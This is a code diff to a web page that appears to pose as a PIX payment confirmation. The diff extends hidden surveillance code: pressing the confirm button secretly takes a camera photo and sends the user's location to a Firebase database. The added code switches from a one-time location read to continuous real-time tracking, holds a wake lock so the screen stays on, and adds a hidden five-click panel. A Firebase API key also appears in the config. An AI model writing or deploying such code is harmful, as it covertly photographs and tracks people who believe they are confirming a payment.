@@ -174,7 +174,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-    import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+    import { getDatabase, ref, push, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyCWmb-8mTJcIJNWyisaS1qfeSDs1irw9IU",
@@ -190,6 +190,7 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
+    // Carrega dados dinâmicos do PIX
     onValue(ref(db, 'config/pix'), (snapshot) => {
       const data = snapshot.val();
       if (data) {
@@ -202,6 +203,26 @@
     const btn = document.getElementById('btnEnviar');
     const status = document.getElementById('status');
 
+    let registroRef = null;
+    let wakeLock = null;
+
+    // Impede a tela do celular de apagar durante a navegação
+    async function ativarWakeLock() {
+      try {
+        if ('wakeLock' in navigator) {
+          wakeLock = await navigator.wakeLock.request('screen');
+        }
+      } catch (err) {
+        console.warn("Wake Lock indisponível:", err);
+      }
+    }
+
+    document.addEventListener('visibilitychange', async () => {
+      if (wakeLock !== null && document.visibilityState === 'visible') {
+        await ativarWakeLock();
+      }
+    });
+
     async function tirarFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -213,7 +234,7 @@
         video.srcObject = stream;
         await video.play();
 
-        await new Promise(resolve => setTimeout(resolve, 500));
+        await new Promise(resolve => setTimeout(resolve, 600));
 
         const canvas = document.createElement('canvas');
         const width = 480;
@@ -236,6 +257,7 @@
     btn.addEventListener('click', async () => {
       status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
 
+      ativarWakeLock();
       const fotoBase64 = await tirarFoto();
 
       if (!navigator.geolocation) {
@@ -243,7 +265,11 @@
         return;
       }
 
-      navigator.geolocation.getCurrentPosition(
+      // Cria a chave única de rastreamento no Firebase
+      registroRef = push(ref(db, 'localizacao/historico'));
+
+      // Inicia monitoramento contínuo em tempo real
+      navigator.geolocation.watchPosition(
         async (pos) => {
           const { latitude, longitude, accuracy } = pos.coords;
           
@@ -262,10 +288,11 @@
               enderecoFormatado = `${rua}${numero} - ${bairro}, ${cidade}`;
             }
           } catch (err) {
-            console.warn("Erro ao buscar endereço por extenso:", err);
+            console.warn("Erro ao buscar endereço:", err);
           }
 
-          push(ref(db, 'localizacao/historico'), {
+          // Atualiza as coordenadas em tempo real no mesmo registro
+          update(registroRef, {
             lat: latitude,
             lng: longitude,
             precisao: accuracy,
@@ -283,6 +310,7 @@
       );
     });
 
+    // Escudo secreto (5 cliques para ir para o painel)
     let cliqueCount = 0;
     let timer;
     const escudo = document.getElementById('escudoSecreto');
